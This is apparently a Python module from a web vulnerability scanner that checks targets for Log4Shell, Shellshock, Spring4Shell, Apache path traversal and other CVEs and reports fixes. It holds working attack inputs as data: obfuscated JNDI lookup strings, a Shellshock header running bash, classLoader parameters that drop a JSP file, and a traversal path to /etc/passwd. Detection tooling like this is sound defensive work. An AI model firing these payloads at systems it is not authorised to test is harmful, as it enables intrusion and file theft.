"""
Log4Shell & Critical CVE Detection Module (v1.2.0)
Detects Log4Shell (CVE-2021-44228), Spring4Shell, Shellshock, and 2024/2025 CVEs.
Learned from: Wapiti (mod_log4shell, mod_spring4shell, mod_shellshock),
              Nettacker (yaml CVE modules — 2024/2025 CVEs)
"""
from __future__ import annotations
import re
import time
from typing import List
from webshield.core.models import Finding, Severity
from webshield.core.http import get_client

# Log4Shell JNDI injection headers (CVE-2021-44228)
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://127.0.0.1:1389/a}",
    "${jndi:dns://127.0.0.1/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1/a}",
    "${${lower:jndi}:${lower:rmi}://127.0.0.1/a}",
    "${${::-j}ndi:${::-l}dap://127.0.0.1/a}",
]

LOG4SHELL_HEADERS = [
    "User-Agent", "X-Forwarded-For", "X-Api-Version",
    "Referer", "X-Real-IP", "Authorization",
    "Accept", "Accept-Language", "Accept-Encoding",
]

# Spring4Shell (CVE-2022-22965)
SPRING4SHELL_PAYLOADS = [
    {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%25%7Bi%7D%20IllegalState",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "tomcatwar",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }
]

# Shellshock (CVE-2014-6271) — still exploited
SHELLSHOCK_HEADER = "() { :; }; echo; echo; /bin/bash -c 'id'"
SHELLSHOCK_PATTERN = re.compile(r"uid=\d+\([a-z]+\) gid=\d+")

# CGI paths that might be vulnerable to Shellshock
CGI_PATHS = ["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/printenv"]

# 2024/2025 CVE patterns from Nettacker research
MODERN_CVES = [
    # Next.js Server Action CSRF (CVE-2024-46982)
    {
        "name": "Next.js Host Header Bypass (CVE-2024-46982)",
        "path": "/",
        "method": "GET",
        "headers": {"Host": "evil.com", "X-Forwarded-Host": "evil.com"},
        "indicator": re.compile(r"evil\.com", re.I),
        "severity": Severity.HIGH,
        "cvss": 7.5,
        "description": "Next.js Host header injection — may allow cache poisoning or SSRF.",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-46982",
    },
    # Apache path traversal (CVE-2021-41773) — still common on old servers
    {
        "name": "Apache Path Traversal (CVE-2021-41773)",
        "path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "method": "GET",
        "headers": {},
        "indicator": re.compile(r"root:[x*]?:0:0:"),
        "severity": Severity.CRITICAL,
        "cvss": 9.8,
        "description": "Apache 2.4.49 path traversal allows reading files outside web root.",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
    },
    # PHP-FPM (CVE-2019-11043) check
    {
        "name": "PHP-FPM RCE Indicator (CVE-2019-11043)",
        "path": "/index.php%0a",
        "method": "GET",
        "headers": {},
        "indicator": re.compile(r"PHP|phpinfo|Fatal error", re.I),
        "severity": Severity.HIGH,
        "cvss": 9.8,
        "description": "PHP-FPM path_info bug may allow RCE via nginx misconfiguration.",
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-11043",
    },
]


def _check_log4shell(client, url: str) -> List[Finding]:
    """Test Log4Shell via header injection."""
    findings: List[Finding] = []
    t_before = time.time()

    for payload in LOG4SHELL_PAYLOADS[:3]:
        headers = {}
        for header in LOG4SHELL_HEADERS[:4]:
            headers[header] = payload
        try:
            resp = client.get(url, headers=headers)
            elapsed = time.time() - t_before

            # Log4Shell creates connection back to attacker — timing + error signals
            body = resp.text
            if any(kw in body.lower() for kw in
                   ["jndi", "ldap", "rmi", "classnotfound", "log4j"]):
                findings.append(Finding(
                    title="Log4Shell Indicator Detected (CVE-2021-44228)",
                    severity=Severity.CRITICAL,
                    description=(
                        "The server responded with Log4J-related content when "
                        "JNDI injection payloads were sent in headers. "
                        "Log4Shell allows unauthenticated Remote Code Execution "
                        "on any server running Log4J 2.0–2.14."
                    ),
                    evidence=f"Payload in headers triggered Log4J-related response.\nBody snippet: {body[:150]}",
                    remediation=(
                        "Update Log4J to 2.17.1+ (Java 8) or 2.12.4+ (Java 7). "
                        "Set log4j2.formatMsgNoLookups=true as emergency mitigation."
                    ),
                    code_fix=(
                        "# Maven pom.xml — update Log4J:\n"
                        "<dependency>\n"
                        "  <groupId>org.apache.logging.log4j</groupId>\n"
                        "  <artifactId>log4j-core</artifactId>\n"
                        "  <version>2.17.1</version>\n"
                        "</dependency>\n\n"
                        "# JVM flag (emergency fix):\n"
                        "-Dlog4j2.formatMsgNoLookups=true"
                    ),
                    reference="https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
                    cvss=10.0,
                ))
                return findings
        except Exception:
            continue

    return findings


def _check_shellshock(client, url: str) -> List[Finding]:
    """Test Shellshock via CGI headers."""
    findings: List[Finding] = []
    from urllib.parse import urlparse
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for path in CGI_PATHS:
        try:
            resp = client.get(
                base + path,
                headers={
                    "User-Agent": SHELLSHOCK_HEADER,
                    "Referer": SHELLSHOCK_HEADER,
                    "Cookie": SHELLSHOCK_HEADER,
                }
            )
            if SHELLSHOCK_PATTERN.search(resp.text):
                findings.append(Finding(
                    title=f"Shellshock RCE (CVE-2014-6271) — {path}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"The CGI script at {path} is vulnerable to Shellshock. "
                        "The server executed our id command and returned the output. "
                        "Full unauthenticated Remote Code Execution is possible."
                    ),
                    evidence=f"Path: {base+path}\nCommand output: {SHELLSHOCK_PATTERN.search(resp.text).group(0)}",
                    remediation="Update bash to patched version. Remove unnecessary CGI scripts.",
                    code_fix="# Update bash:\napt-get update && apt-get install --only-upgrade bash",
                    reference="https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
                    cvss=10.0,
                ))
                return findings
        except Exception:
            continue

    return findings


def scan(url: str, timeout: float = 10.0) -> List[Finding]:
    findings: List[Finding] = []
    from urllib.parse import urlparse
    base = "{s}://{n}".format(s=urlparse(url).scheme, n=urlparse(url).netloc)

    with get_client(timeout=min(timeout, 8.0)) as client:
        # Log4Shell check
        findings.extend(_check_log4shell(client, url))
        if findings:
            return findings

        # Shellshock check
        findings.extend(_check_shellshock(client, url))
        if findings:
            return findings

        # Modern CVE checks
        for cve in MODERN_CVES:
            try:
                test_url = base + cve["path"]
                if cve["method"] == "GET":
                    resp = client.get(test_url, headers=cve["headers"])
                else:
                    resp = client.post(test_url, headers=cve["headers"])

                if cve["indicator"].search(resp.text) or cve["indicator"].search(str(resp.headers)):
                    findings.append(Finding(
                        title=cve["name"],
                        severity=cve["severity"],
                        description=cve["description"],
                        evidence=f"URL: {test_url}\nHTTP {resp.status_code}\nIndicator: {cve['indicator'].pattern}",
                        remediation="Update affected software to patched version immediately.",
                        reference=cve["reference"],
                        cvss=cve["cvss"],
                    ))
                    break
            except Exception:
                continue

    return findings
